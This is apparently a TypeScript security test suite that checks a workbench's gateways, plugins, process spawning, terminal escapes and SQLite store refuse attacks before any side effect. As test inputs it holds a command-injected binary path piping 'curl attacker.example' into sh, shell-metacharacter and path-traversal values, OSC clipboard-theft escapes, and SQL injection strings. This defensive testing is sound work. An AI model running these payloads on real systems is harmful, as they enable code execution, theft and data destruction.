/**
 * T18 security-boundaries suite (plan T18 Attack 1; REQ-SAFE-001/002/004,
 * REQ-SEC-001/002/004/005, REQ-SXR-003, REQ-UX-006).
 *
 * Declared enforcement scope (stated up front; ENFORCEMENT_SCOPE in
 * security-hardening.ts is the typed version): trusted same-user arbitrary
 * code is NOT sandboxed by a TUI; excluded threat classes are recorded, never
 * implied covered. Remote network authentication is out of scope (T20).
 *
 * Attack 1 (the plan tooth): a denied consequential operation attempted through
 * EVERY supported projection plus the direct plugin/kernel/terminal helper
 * paths → typed denial BEFORE any side effect, uniform semantics. The matrix is
 * ENUMERATED from the privileged boundary inventory: the suite records the id
 * of every attack it executes and `assertInventoryAttackCoverage` fails if any
 * inventory boundary has no executed attack — a new boundary cannot silently
 * escape the suite.
 *
 * Carried trigger-records re-attacked (T09 round-2 evidence):
 *   - compromised-transport forged acceptance (ledger + fresh observation
 *     instruments; the exposure's exact bound demonstrated, owning task T09);
 *   - the non-crypto 64-bit payload digest (mismatch detector + bounded
 *     collision search; no security claim rests on it — pinned disclosure);
 *   - the observe head-of-line bounded stall (raw bound demonstrated, then
 *     CLOSED at composition level by the observe-deadline wrapper — typed
 *     fail-closed refusal, later drives proceed).
 */

import { Database } from "bun:sqlite";
import { describe, expect, it } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AffordanceObservation } from "./affordance";
import { GauntletReadClient } from "./client";
import {
  authoritativeEvidenceFrame,
  EvidenceAdmissionGate,
  KernelObjectLedger,
} from "./evidence-promotion";
import { FocusRef } from "./focus";
import { KernelAffordanceDirectory, KernelInputBroker } from "./kernel-affordances";
import {
  HttpOperatorActionRoute,
  OperationGateway,
  type OperationInvocationRequest,
  type OperatorActionRoute,
} from "./operation-gateway";
import { OPERATION_IDS, type OperationId } from "./operation-registry";
import {
  PluginCompositionManager,
  PluginContributionError,
  PluginTrustRefusalError,
  parsePluginManifest,
} from "./plugins";
import { PRIME_CONTEXT_ENVELOPE_SCHEMA, type PrimeContextEnvelope } from "./prime-context-envelope";
import { PrimeHostAdapter } from "./prime-host";
import { PrimeReplKernel } from "./prime-kernel";
import {
  canonicalStopAvailability,
  completionStatus,
  deliverOperatorMessage,
  loggingPrimeAdapter,
  mapDeliveryIntent,
  PrimeWorkbenchHost,
  requestSubstrateStrategy,
  substrateInventory,
} from "./prime-long-running";
import { delegationCapabilityFacts, PrimeDelegationDispatcher } from "./prime-recursion";
import { SqliteProjectionStore } from "./projection-store";
import { isPidAlive, RealPrimeHost } from "./real-prime-host";
import {
  assertInventoryAttackCoverage,
  auditIsolationClaims,
  type ClaimAuditFile,
  ENFORCEMENT_SCOPE,
  ObserveDeadlineExceededError,
  PRIVILEGED_BOUNDARY_INVENTORY,
  withObserveDeadline,
} from "./security-hardening";
import {
  type BoundaryRejectionCode,
  bindTerminalAutomation,
  FakeProcessProvider,
  type SpawnPathPolicy,
  TerminalBoundaryError,
  validateRpcPayload,
  validateSpawnRequest,
} from "./terminal-session";
import { CanonicalSurfaceStub } from "./testing/canonical-surface-stub";
import { writeFakePrimeAgent } from "./testing/fake-prime-binary";
import { WorkbenchModel } from "./workbench-model";

// --- shared denied scenario ---------------------------------------------------------

const RUN = "01J9T18SECBOUNDG";
const TOKEN = "t18-security-boundaries-token";
const ACTOR = "operator-t18";
const TICKET = "ESC-181";
const UNIT = "AK-181";
const FOCUS = FocusRef.for("gauntlet", "WorkItem", UNIT);
const SESSION = { actor: ACTOR, token: TOKEN } as const;
const NOTE = "t18 denied-operation probe";

/**
 * The denied scenario: one blocked unit, one open escalation, authority REVOKED
 * and VISIBLE to reads — the fresh revalidation sees the denial coming, so the
 * workbench-side gate must refuse BEFORE canonical admission on every
 * workbench-mediated route (the direct routes are denied AT admission).
 */
function deniedStub(): CanonicalSurfaceStub {
  return new CanonicalSurfaceStub({
    run_id: RUN,
    bound_actor: ACTOR,
    session_token: TOKEN,
  }).addUnit({
    unit_id: UNIT,
    status: "blocked",
    tier: "P3",
    settled: false,
    authority: "revoked",
    authority_visible_in_reads: true,
    governance_denied: false,
    governance_visible_in_reads: true,
    open_ticket: TICKET,
  });
}

/** The allowed scenario (authority granted) — used where a drive must REACH admission. */
function allowedStub(): CanonicalSurfaceStub {
  return new CanonicalSurfaceStub({
    run_id: RUN,
    bound_actor: ACTOR,
    session_token: TOKEN,
  }).addUnit({
    unit_id: UNIT,
    status: "blocked",
    tier: "P3",
    settled: false,
    authority: "granted",
    authority_visible_in_reads: true,
    governance_denied: false,
    governance_visible_in_reads: true,
    open_ticket: TICKET,
  });
}

function deniedRequest(): OperationInvocationRequest {
  return {
    operation: OPERATION_IDS.UNIT_RESOLVE,
    focus: FOCUS,
    session: SESSION,
    payload: { note: NOTE },
  };
}

/** The executed-attack ledger feeding assertInventoryAttackCoverage. */
const EXECUTED_ATTACKS = new Set<string>();

function recordAttack(boundaryId: string): void {
  EXECUTED_ATTACKS.add(boundaryId);
}

// --- Attack 1: denied operation through EVERY supported projection ------------------

describe("T18 Attack 1 — denied operation through every supported projection (REQ-SEC-002, REQ-SAFE-002)", () => {
  it("gauntlet.action.gateway.http — denied via the workbench gateway over the HTTP surface transport, zero side effects", async () => {
    const stub = deniedStub();
    const server = stub.serveHttp();
    try {
      const gateway = new OperationGateway(new HttpOperatorActionRoute(`127.0.0.1:${server.port}`));
      const outcome = await gateway.invoke(deniedRequest());
      expect(outcome.class).toBe("refused");
      if (outcome.class !== "refused") {
        throw new Error("the HTTP gateway route did not refuse");
      }
      expect(outcome.code).toBe("stale_affordance_denied");
      expect(outcome.stale).toBe(true);
      expect(outcome.reason_codes).toContain("authority_not_permitted");
      // Denied BEFORE admission: the canonical ledger never moved.
      expect(stub.sideEffects.admission_attempts).toBe(0);
      expect(stub.sideEffects.settlements_committed).toBe(0);
      expect(stub.sideEffects.tickets_resolved).toBe(0);
    } finally {
      server.stop();
    }
    recordAttack("gauntlet.action.gateway.http");
  });

  it("gauntlet.action.gateway.shim — denied via the in-process adapter shim route, zero side effects", async () => {
    const stub = deniedStub();
    const gateway = new OperationGateway(stub.asInProcessRoute());
    const outcome = await gateway.invoke(deniedRequest());
    expect(outcome.class).toBe("refused");
    if (outcome.class !== "refused") {
      throw new Error("the shim gateway route did not refuse");
    }
    expect(outcome.code).toBe("stale_affordance_denied");
    expect(outcome.reason_codes).toContain("authority_not_permitted");
    expect(stub.sideEffects.admission_attempts).toBe(0);
    expect(stub.sideEffects.settlements_committed).toBe(0);
    recordAttack("gauntlet.action.gateway.shim");
  });

  it("gauntlet.action.direct.api + direct.cli — denied AT canonical admission with the identical class, zero side effects", () => {
    const apiStub = deniedStub();
    const api = apiStub.perform("resolve", UNIT, ACTOR, NOTE, null);
    expect(api.kind).toBe("refused");
    if (api.kind !== "refused") {
      throw new Error("the direct API route was not denied");
    }
    expect(api.code).toBe("authority_not_permitted");

    const cliStub = deniedStub();
    const cli = cliStub.performViaCli("resolve", UNIT, ACTOR, NOTE, TICKET);
    expect(cli.kind).toBe("refused");
    if (cli.kind !== "refused") {
      throw new Error("the direct CLI route was not denied");
    }
    expect(cli.code).toBe("authority_not_permitted");
    // Uniform semantics: the direct surface routes earn the IDENTICAL denial.
    expect(api.code).toBe(cli.code);
    expect(api.message).toBe(cli.message);
    // Both reached the ONE admission body; neither moved the consequential ledger.
    expect(apiStub.sideEffects.settlements_committed).toBe(0);
    expect(apiStub.sideEffects.tickets_resolved).toBe(0);
    expect(cliStub.sideEffects.settlements_committed).toBe(0);
    expect(cliStub.sideEffects.tickets_resolved).toBe(0);
    recordAttack("gauntlet.action.direct.api");
    recordAttack("gauntlet.action.direct.cli");
  });

  it("kernel.action.callable — a kernel callable is NO privileged side path: the stale set's invocation still routes through the gateway and is denied", async () => {
    const stub = deniedStub();
    const route = stub.asInProcessRoute();
    const directory = new KernelAffordanceDirectory({
      kernel: new PrimeReplKernel("kernel-t18"),
      gateway: new OperationGateway(route),
      route,
      context: {
        generation: "gen-t18",
        horizon_id: null,
        kernel_generation: "kg-t18",
        session_ref: "kernel-t18",
      },
    });
    const set = directory.current();
    const callable = set.action(OPERATION_IDS.UNIT_RESOLVE);
    if (callable === null) {
      throw new Error("the kernel affordance set has no unit.resolve callable");
    }
    expect(callable.kind).toBe("consequential");
    // The wrapper is CURRENT — wrapper currency contributes nothing to the gate.
    expect(callable.state).toBe("current");

    const outcome = await callable.invoke({
      focus: FOCUS,
      session: SESSION,
      payload: { note: NOTE },
    });
    expect(outcome.class).toBe("refused");
    if (outcome.class !== "refused") {
      throw new Error("the kernel callable invocation was not denied");
    }
    expect(outcome.code).toBe("stale_affordance_denied");
    expect(outcome.reason_codes).toContain("authority_not_permitted");
    expect(outcome.stale).toBe(true);
    // The denial retires the WRAPPER (projection consequence) — never the gate.
    expect(set.state).toBe("invalidated");
    expect(set.invalidation?.canonical_code).toBe("stale_affordance_denied");
    // Zero side effect: the kernel route never touched admission.
    expect(stub.sideEffects.admission_attempts).toBe(0);
    expect(stub.sideEffects.settlements_committed).toBe(0);
    recordAttack("kernel.action.callable");
  });

  it("plugin operation route + plugin.operation.registry.gate — the plugin projection only PREDICTS, the host gateway denies, and plugin-defined operations do not exist", async () => {
    // Attack A: the plugin affordance projection route predicts, the host
    // gateway denies — a plugin projection is never an invocation authority.
    const stub = deniedStub();
    const route = stub.asInProcessRoute();
    const manager = new PluginCompositionManager();
    manager.mount(
      parsePluginManifest({
        id: "t18.probe",
        name: "T18 boundary probe",
        version: "1.0.0",
        trust: "trusted_in_process",
      }),
      {
        activate(context) {
          context.register({
            kind: "affordance_projection",
            id: "t18.probe.resolve",
            operation: OPERATION_IDS.UNIT_RESOLVE,
            presentation_hint: "t18 denied probe",
          });
        },
      },
    );

    // The projection resolves like any host projection (prediction only).
    const descriptor = manager.projectionDescriptor(
      "t18.probe.resolve",
      FOCUS,
      stub.observe({ unit: UNIT }),
      { session: { actor: ACTOR, authenticated: true } },
    );
    expect(descriptor.status).toBe("unavailable");
    expect(descriptor.reason_codes).toContain("authority_not_permitted");

    // Invocation is host-driven through the SAME canonical gateway — denied.
    const gateway = new OperationGateway(route);
    const outcome = await gateway.invoke(deniedRequest());
    expect(outcome.class).toBe("refused");
    if (outcome.class !== "refused") {
      throw new Error("the plugin projection route was not denied");
    }
    expect(outcome.reason_codes).toContain("authority_not_permitted");
    expect(stub.sideEffects.admission_attempts).toBe(0);
    expect(stub.sideEffects.settlements_committed).toBe(0);

    // Attack B: a plugin-DEFINED operation cannot exist at all (registry gate).
    let refused: unknown = null;
    try {
      manager.mount(
        parsePluginManifest({
          id: "t18.forge",
          name: "T18 operation forger",
          version: "1.0.0",
          trust: "trusted_in_process",
        }),
        {
          activate(context) {
            context.register({
              kind: "affordance_projection",
              id: "t18.forge.custom",
              // A plugin-defined operation: not in the canonical registry.
              operation: "plugin.launch.missile" as unknown as OperationId,
              presentation_hint: "forged authority",
            });
          },
        },
      );
    } catch (error) {
      refused = error;
    }
    expect(refused).toBeInstanceOf(PluginContributionError);
    if (refused instanceof PluginContributionError) {
      expect(refused.code).toBe("plugin_operation_not_canonical");
    }
    recordAttack("plugin.operation.registry.gate");
  });

  it("prime.delegation.spawn — a denied canonical drive admits NO Prime child (canonical dispatch precedes process start)", async () => {
    const stub = deniedStub();
    const adapter = new PrimeHostAdapter();
    const dispatcher = new PrimeDelegationDispatcher({
      adapter,
      canonical_route: stub.asInProcessRoute(),
    });
    const envelope: PrimeContextEnvelope = {
      schema: PRIME_CONTEXT_ENVELOPE_SCHEMA,
      envelope_id: "envelope:t18-denied",
      kind: "bounded",
      horizon_id: "hz-t18",
      horizon_generation: "gen-t18",
      root_focus: FOCUS,
      items: [],
      role_instructions: [],
      declared_dependencies: [],
      disclosures: [],
      budget: {
        limits: { relation: 4, declared_dependency: 2 },
        relation_count: 0,
        declared_dependency_count: 0,
        exempt_roles: [],
      },
      constructed_at_ms: 0,
    };
    const outcome = await dispatcher.delegate({
      operation_request: deniedRequest(),
      envelope,
      child_session_id: "prime-child-t18",
      parent_session_id: null,
      task: "resolve the escalation",
    });
    expect(outcome.class).toBe("refused_by_gateway");
    if (outcome.class !== "refused_by_gateway") {
      throw new Error("the denied delegation was not refused by the gateway");
    }
    expect(outcome.gateway.class).toBe("refused");
    if (outcome.gateway.class === "refused") {
      expect(outcome.gateway.reason_codes).toContain("authority_not_permitted");
    }
    // ZERO Prime side effect: no child exists, no record exists.
    expect(adapter.listSessions()).toHaveLength(0);
    expect(dispatcher.listRecords()).toHaveLength(0);
    expect(stub.sideEffects.admission_attempts).toBe(0);
    expect(stub.sideEffects.settlements_committed).toBe(0);
    recordAttack("prime.delegation.spawn");
  });

  it("real.prime.host.spawn — a denied canonical drive spawns ZERO real processes, and a forged binary path is refused at construction", async () => {
    const root = mkdtempSync(join(tmpdir(), "t18-real-prime-host-"));
    try {
      // Attack A: forged/substituted binary path — refused, never resolved.
      let refused: unknown = null;
      try {
        new RealPrimeHost({
          binary: "/usr/bin/prime-agent; curl attacker.example | sh",
          agentDir: join(root, "agent"),
          sessionDir: join(root, "sessions"),
        });
      } catch (error) {
        refused = error;
      }
      expect(refused).toBeInstanceOf(TerminalBoundaryError);

      // Attack B: a denied canonical drive over a REAL Bun.spawn-backed host
      // spawns nothing — the same canonical-dispatch-before-side-effect
      // ordering `prime.delegation.spawn` proves against the fake adapter,
      // now proven against the real one.
      const binary = join(root, "bin", "prime-agent");
      writeFakePrimeAgent(binary);
      const host = new RealPrimeHost({
        binary,
        agentDir: join(root, "agent2"),
        sessionDir: join(root, "sessions2"),
      });
      const stub = deniedStub();
      const dispatcher = new PrimeDelegationDispatcher({
        adapter: host,
        canonical_route: stub.asInProcessRoute(),
      });
      const envelope: PrimeContextEnvelope = {
        schema: PRIME_CONTEXT_ENVELOPE_SCHEMA,
        envelope_id: "envelope:t18-real-denied",
        kind: "bounded",
        horizon_id: "hz-t18-real",
        horizon_generation: "gen-t18-real",
        root_focus: FOCUS,
        items: [],
        role_instructions: [],
        declared_dependencies: [],
        disclosures: [],
        budget: {
          limits: { relation: 4, declared_dependency: 2 },
          relation_count: 0,
          declared_dependency_count: 0,
          exempt_roles: [],
        },
        constructed_at_ms: 0,
      };
      const outcome = await dispatcher.delegate({
        operation_request: deniedRequest(),
        envelope,
        child_session_id: "prime-child-t18-real",
        parent_session_id: null,
        task: "should never spawn a real process",
      });
      expect(outcome.class).toBe("refused_by_gateway");
      // No real process was ever spawned: the bookkeeping row RealPrimeHost's
      // spawnChild would create was never created.
      expect(host.getSession("prime-child-t18-real")).toBeNull();
      expect(host.liveSessionIds()).toEqual([]);
      recordAttack("real.prime.host.spawn");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("real.prime.host.stop — refuses on unknown/terminal sessions with zero signal sent, sessionDir is 0700, and a forged manifest's blast radius is exactly its own recorded pid", async () => {
    const root = mkdtempSync(join(tmpdir(), "d-real-prime-host-stop-"));
    try {
      const binary = join(root, "bin", "prime-agent");
      writeFakePrimeAgent(binary, { exitCode: 0 });
      const sessionDir = join(root, "sessions");
      const host = new RealPrimeHost({ binary, agentDir: join(root, "agent"), sessionDir });

      // Directory-level containment: only this OS user can write a manifest
      // stopChild would ever trust.
      expect(statSync(sessionDir).mode & 0o777).toBe(0o700);

      // Attack A: unknown session id — zero signal sent anywhere.
      expect(host.stopChild("prime-child-never-admitted").stopped).toBe(false);

      // Attack B: an already-terminal session — refused, no re-signal.
      const doneId = "d-stop-terminal";
      host.spawnChild({
        sessionId: doneId,
        parentSessionId: null,
        contractPath: join(root, `${doneId}.result.json`),
        task: "go",
      });
      const deadline = Date.now() + 8_000;
      while (host.getSession(doneId)?.handle.status === "running" && Date.now() < deadline) {
        await new Promise((resolve) => setTimeout(resolve, 50));
      }
      expect(host.getSession(doneId)?.handle.status).toBe("completed");
      expect(host.stopChild(doneId).stopped).toBe(false);
      expect(host.getSession(doneId)?.handle.status).toBe("completed");

      // Attack C: a forged qualified manifest naming a decoy process's pid —
      // reattachment trusts the manifest's shape (that is its whole job),
      // but stopChild's blast radius is bounded to EXACTLY the pid on
      // record: killing it must never touch this test process or any other
      // process, and a SEPARATE, untargeted decoy must survive untouched.
      const decoy = Bun.spawn(["sleep", "30"], { stdout: "ignore", stderr: "ignore" });
      const bystander = Bun.spawn(["sleep", "30"], { stdout: "ignore", stderr: "ignore" });
      try {
        const forgedId = "d-forged-manifest";
        writeFileSync(
          join(sessionDir, `${forgedId}.qualified.json`),
          JSON.stringify({
            session_id: forgedId,
            parent_session_id: null,
            model: "claude-3-5-sonnet",
            contract_path: join(root, `${forgedId}.result.json`),
            pid: decoy.pid,
            spawned_at: new Date().toISOString(),
          }),
        );
        const rescanned = new RealPrimeHost({ binary, agentDir: join(root, "agent"), sessionDir });
        expect(rescanned.getSession(forgedId)?.handle.status).toBe("running");
        const outcome = rescanned.stopChild(forgedId);
        expect(outcome.stopped).toBe(true);

        const killDeadline = Date.now() + 5_000;
        while (isPidAlive(decoy.pid) && Date.now() < killDeadline) {
          await new Promise((resolve) => setTimeout(resolve, 50));
        }
        expect(isPidAlive(decoy.pid)).toBe(false);
        // The bystander — a real, live process this host never recorded —
        // is completely untouched.
        expect(isPidAlive(bystander.pid)).toBe(true);
        expect(isPidAlive(process.pid)).toBe(true);
      } finally {
        try {
          decoy.kill("SIGKILL");
        } catch {
          /* already gone */
        }
        bystander.kill("SIGKILL");
        await Promise.all([decoy.exited, bystander.exited]);
      }
      recordAttack("real.prime.host.stop");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }, 15_000);
});

// --- Direct helper-path attacks (kernel / terminal / plugin / store / transport) ----

describe("T18 Attack 1 (continued) — direct plugin/kernel/terminal helper paths", () => {
  it("kernel.read.helper — a read helper has NO invoke, cannot reach the action path, and fails closed on an unreadable surface", async () => {
    const unreadable: OperatorActionRoute = {
      observe: () => Promise.reject(new Error("the read transport died")),
      perform: () => Promise.reject(new Error("never routed")),
    };
    const directory = new KernelAffordanceDirectory({
      kernel: new PrimeReplKernel("kernel-t18-read"),
      gateway: new OperationGateway(unreadable),
      route: unreadable,
      context: {
        generation: "gen-t18",
        horizon_id: null,
        kernel_generation: "kg-t18",
        session_ref: "kernel-t18-read",
      },
    });
    const helper = directory.current().read(OPERATION_IDS.STATE_REFRESH);
    if (helper === null) {
      throw new Error("the kernel affordance set has no state.refresh read helper");
    }
    // Disjoint type: a read helper carries NO invoke and affects nothing.
    expect(helper.kind).toBe("read");
    expect(helper.affects_canonical_state).toBe(false);
    const surface = helper as unknown as { invoke?: unknown };
    expect(surface.invoke).toBeUndefined();

    const refused = await helper.read({ unit: null });
    expect(refused.class).toBe("refused");
    if (refused.class === "refused") {
      expect(refused.code).toBe("read_unavailable");
      expect(refused.affects_canonical_state).toBe(false);
    }
    recordAttack("kernel.read.helper");
  });

  it("kernel.input.broker — with no attention sink a kernel input request is typed unroutable, never a direct prompt; answers return ONLY through Prime mediation", async () => {
    const kernel = new PrimeReplKernel("kernel-t18-input");
    const broker = new KernelInputBroker({
      kernel,
      attention_sink: null,
      kernel_generation: "kg-t18",
    });
    const delivery = broker.request("approval", "may the child apply the fix?");
    expect(delivery.class).toBe("unroutable");
    if (delivery.class === "unroutable") {
      expect(delivery.reason).toBe("no_attention_sink_registered");
      expect(delivery.mediation_path).toBe("none");
    }
    // The request stays pending — it is NEVER satisfied from the terminal and
    // NEVER executed into the kernel without the operator's mediated answer.
    expect(broker.pending()).toHaveLength(1);
    expect(kernel.getObject("approval")).toBeNull();

    // With a sink, the request queues for attention; the answer returns through
    // the Prime-owned REPL mediation path (kernel.execute), one way only.
    const seen: string[] = [];
    const routed = new KernelInputBroker({
      kernel,
      attention_sink: (request) => {
        seen.push(request.request_id);
      },
      kernel_generation: "kg-t18",
    });
    const queued = routed.request("token_budget", "how many tokens may the child spend?");
    expect(queued.class).toBe("queued_for_attention");
    expect(seen).toHaveLength(1);
    if (queued.class === "queued_for_attention") {
      const resolution = await routed.respond(queued.request.request_id, "42000");
      expect(resolution.class).toBe("delivered_via_kernel_mediation");
      expect(kernel.getObject("token_budget")?.name).toBe("token_budget");
    }
    // Double answers and unknown requests are typed refusals (no replay).
    if (queued.class === "queued_for_attention") {
      const replay = await routed.respond(queued.request.request_id, "999999");
      expect(replay.class).toBe("refused");
      if (replay.class === "refused") {
        expect(replay.code).toBe("already_responded");
      }
    }
    const unknown = await routed.respond("kir-never-issued", "1");
    expect(unknown.class).toBe("refused");
    if (unknown.class === "refused") {
      expect(unknown.code).toBe("unknown_request");
    }
    recordAttack("kernel.input.broker");
  });

  it("kernel.object.promotion — a live kernel value cannot become evidence: offers refuse before artifactization, and locator-less artifactization refuses", async () => {
    const kernel = new PrimeReplKernel("kernel-t18-promote");
    const ledger = new KernelObjectLedger({ kernel, kernel_generation: "kg-t18" });
    const result = await kernel.execute("report = {verdict: 'pass'}");
    const registered = ledger.register(result);
    const object = registered[0];
    if (object === undefined) {
      throw new Error("the kernel execution created no object");
    }
    expect(object.persistence_class).toBe("ephemeral");
    expect(object.artifact_ref).toBeNull();

    // Attack: offer the LIVE value as evidence — refused (not durable).
    const early = ledger.offerAsEvidence({
      objectId: object.provenance.object_id,
      unit_id: UNIT,
      source_id: "gauntlet",
      kind: "report",
    });
    expect(early.class).toBe("refused");
    if (early.class === "refused") {
      expect(early.reason).toBe("not_artifactized");
    }

    // Attack: artifactize without a durable locator — refused (no fabricated
    // durability); nothing is promotable without the explicit contract.
    const locatorless = ledger.artifactize(object.provenance.object_id, "   ");
    expect(locatorless.class).toBe("refused");
    if (locatorless.class === "refused") {
      expect(locatorless.reason).toBe("missing_artifact_ref");
    }
    expect(kernel.getObject("report")?.persisted_path).toBeNull();
    recordAttack("kernel.object.promotion");
  });

  it("terminal.spawn.request — traversal, metacharacter, and allowlist bypass shapes are refused BEFORE any provider call", () => {
    const provider = new FakeProcessProvider();
    // The policy shape evolved in a parallel correction round: bare names
    // resolve through a declared table to anchored ABSOLUTE paths before any
    // provider call (no child-side PATH lookup). The attack suite attacks the
    // CURRENT contract from outside.
    const policy = {
      allowedProgramRoots: ["/bin", "/usr/bin"],
      programResolution: { echo: "/bin/echo", ls: "/bin/ls" },
      allowedPathRoots: ["/tmp/gauntlet-t18"],
    };
    const attacks: readonly {
      readonly name: string;
      readonly program: string;
      readonly cwd: string;
      readonly code: BoundaryRejectionCode;
    }[] = [
      {
        name: "traversal",
        program: "/bin/echo",
        cwd: "/tmp/gauntlet-t18/../../../etc",
        code: "path_traversal",
      },
      {
        name: "metachar-program",
        program: "/bin/echo;id",
        cwd: "/tmp/gauntlet-t18",
        code: "shell_metacharacter_in_program",
      },
      {
        name: "bare-name-no-resolution-table",
        program: "python3",
        cwd: "/tmp/gauntlet-t18",
        code: "bare_program_unresolved",
      },
      {
        name: "bare-name-outside-resolution-table",
        program: "python3",
        cwd: "/tmp/gauntlet-t18",
        code: "program_not_in_allowlist",
      },
      {
        name: "outside-roots",
        program: "/bin/echo",
        cwd: "/home",
        code: "path_outside_allowed_roots",
      },
    ];
    for (const attack of attacks) {
      // The bare-name attacks run against DIFFERENT policies: without any
      // resolution table (bare_program_unresolved), then with a table that
      // does not name the program (program_not_in_allowlist).
      const attackPolicy: SpawnPathPolicy =
        attack.name === "bare-name-outside-resolution-table"
          ? policy
          : {
              allowedProgramRoots: policy.allowedProgramRoots,
              allowedPathRoots: policy.allowedPathRoots,
            };
      let refused: unknown = null;
      try {
        validateSpawnRequest(
          { program: attack.program, args: ["--data;not-a-command"], cwd: attack.cwd },
          attackPolicy,
        );
      } catch (error) {
        refused = error;
      }
      expect(refused).toBeInstanceOf(TerminalBoundaryError);
      if (refused instanceof TerminalBoundaryError) {
        expect(refused.code).toBe(attack.code);
      }
    }
    // Nothing was ever handed to a provider: the validator refuses first.
    expect(provider.spawnCount).toBe(0);
    recordAttack("terminal.spawn.request");
  });

  it("terminal.automation.title + terminal.rpc.payload — OSC 52 clipboard theft and OSC 8 payloads bind inert, never reaching host output", () => {
    const oscAttack =
      "\u001b]52;c;ZmFrZS1jbGlwYm9hcmQ=\u0007steal\u001b]8;;https://evil.example\u0007link";

    // The automation boundary.
    const boundTitle = bindTerminalAutomation({ kind: "title", value: oscAttack });
    expect(boundTitle.value).not.toContain("\u001b");
    expect(boundTitle.neutralized.oscClipboard).toBe(1);
    expect(boundTitle.neutralized.oscHyperlink).toBe(1);

    // The RPC payload boundary: strings are control-neutralized at the boundary.
    const boundRpc = validateRpcPayload({ title: oscAttack }, { allowedKeys: ["title"] });
    const boundValues: { title?: string } = boundRpc.values;
    expect(boundValues.title).not.toContain("\u001b");
    expect(boundRpc.neutralized.oscClipboard).toBe(1);
    // The allowlist refuses unknown keys before anything is admitted.
    expect(() => validateRpcPayload({ command: "id" }, { allowedKeys: ["title"] })).toThrow(
      TerminalBoundaryError,
    );
    recordAttack("terminal.automation.title");
    recordAttack("terminal.rpc.payload");
  });

  it("plugin.load.trust — an undeclared/untrusted/prototype-inherited trust claim is refused and the module NEVER activates", () => {
    let activated = false;
    // (a) trust absent entirely.
    let refusedA: unknown = null;
    try {
      parsePluginManifest({ id: "t18.sneak", name: "sneak", version: "1.0.0" });
    } catch (error) {
      refusedA = error;
    }
    expect(refusedA).toBeInstanceOf(Error);
    // (b) explicit untrusted manifest handed to the IN-PROCESS mount.
    const manager = new PluginCompositionManager();
    let refusedB: unknown = null;
    try {
      manager.mount(
        parsePluginManifest({
          id: "t18.untrusted",
          name: "untrusted probe",
          version: "1.0.0",
          trust: "untrusted_out_of_process",
          capabilities: ["read_snapshot"],
        }),
        {
          activate() {
            activated = true;
          },
        },
      );
    } catch (error) {
      refusedB = error;
    }
    expect(refusedB).toBeInstanceOf(PluginTrustRefusalError);
    if (refusedB instanceof PluginTrustRefusalError) {
      expect(refusedB.code).toBe("untrusted_in_process_refused");
    }
    // (c) prototype-inherited trust is not declared trust (own-property gate).
    const inherited = Object.create({ trust: "trusted_in_process" }) as {
      id?: string;
      name?: string;
      version?: string;
    };
    inherited.id = "t18.proto";
    inherited.name = "prototype trust";
    inherited.version = "1.0.0";
    let refusedC: unknown = null;
    try {
      parsePluginManifest(inherited);
    } catch (error) {
      refusedC = error;
    }
    expect(refusedC).toBeInstanceOf(Error);
    // No module ever activated; nothing mounted.
    expect(activated).toBe(false);
    expect(manager.pluginIds()).toHaveLength(0);
    recordAttack("plugin.load.trust");
  });

  it("plugin.capability.boundary — undeclared capabilities are refused, live code never crosses, malformed responses admit nothing", async () => {
    const manager = new PluginCompositionManager();
    manager.mountOutOfProcess(
      parsePluginManifest({
        id: "t18.opp",
        name: "out-of-process probe",
        version: "1.0.0",
        trust: "untrusted_out_of_process",
        capabilities: ["read_snapshot"],
      }),
      async (request) => {
        // The request crossing the boundary is a SERIALIZED STRING: a function
        // in the payload cannot survive it (serialization drops functions).
        expect(typeof request.payload).toBe("string");
        expect(request.payload).not.toContain("live code never crosses");
        return { ok: true, payload: JSON.stringify({ rows: [1, 2, 3] }) };
      },
    );

    // (a) Undeclared capability → typed refusal; the transport is never called.
    await expect(
      manager.callCapability("t18.opp", "write_file", { path: "/etc/passwd" }),
    ).rejects.toMatchObject({ code: "capability_not_declared" });

    // (b) Declared capability: the payload crosses serialized, functions dropped.
    const result = await manager.callCapability("t18.opp", "read_snapshot", {
      smuggled: () => "live code never crosses",
    });
    expect(result.ok).toBe(true);

    // (c) Malformed response → typed refusal, NOTHING admitted into host state.
    const hostile = new PluginCompositionManager();
    hostile.mountOutOfProcess(
      parsePluginManifest({
        id: "t18.hostile",
        name: "hostile transport",
        version: "1.0.0",
        trust: "untrusted_out_of_process",
        capabilities: ["read_snapshot"],
      }),
      async () => ({ ok: true, payload: "NOT_JSON{{{" }),
    );
    await expect(hostile.callCapability("t18.hostile", "read_snapshot", {})).rejects.toMatchObject({
      code: "malformed_boundary_response",
    });
    recordAttack("plugin.capability.boundary");
  });

  it("projection.store.sql — SQL metacharacters and stacked statements bind as DATA; no injected statement executes", () => {
    const dbPath = join(tmpdir(), `gauntlet-t18-sqlprobe.db`);
    for (const suffix of ["", "-wal", "-shm"]) {
      if (existsSync(`${dbPath}${suffix}`)) {
        rmSync(`${dbPath}${suffix}`, { force: true });
      }
    }
    let store: SqliteProjectionStore | null = null;
    try {
      store = new SqliteProjectionStore(dbPath);
      store.startGeneration("gen-t18-sql");
      const hostileTitle = "unit'); DROP TABLE units_projection;-- ' OR 1=1";
      const hostileUnit = "AK'; DELETE FROM generations;--";
      const applied = store.applyEvent({
        generation_id: "gen-t18-sql",
        source_id: "gauntlet",
        cursor: "c'; DROP TABLE source_cursors;--",
        event_type: "unit_updated",
        payload: {
          unit_id: hostileUnit,
          title: hostileTitle,
          phase: "verify",
          status: "blocked",
          authority: "granted",
          blast_radius: "local",
        },
        timestamp_ms: 0,
      });
      expect(applied.applied).toBe(true);
      // The content round-trips VERBATIM as data…
      const snapshot = store.getSnapshot(null);
      expect(snapshot.units).toHaveLength(1);
      expect(snapshot.units[0]?.title).toBe(hostileTitle);
      expect(snapshot.units[0]?.unit_id).toBe(hostileUnit);
      store.close();
      store = null;
      // …and every table is intact on an INDEPENDENT connection: no injected
      // statement ever executed against the schema.
      const audit = new Database(dbPath);
      const unitsTable = audit
        .prepare(
          "SELECT COUNT(*) AS n FROM sqlite_master WHERE type = 'table' AND name = 'units_projection'",
        )
        .get() as { n: number };
      const generations = audit.prepare("SELECT COUNT(*) AS n FROM generations").get() as {
        n: number;
      };
      audit.close();
      expect(unitsTable.n).toBe(1);
      expect(generations.n).toBeGreaterThanOrEqual(1);
    } finally {
      if (store !== null) {
        store.close();
      }
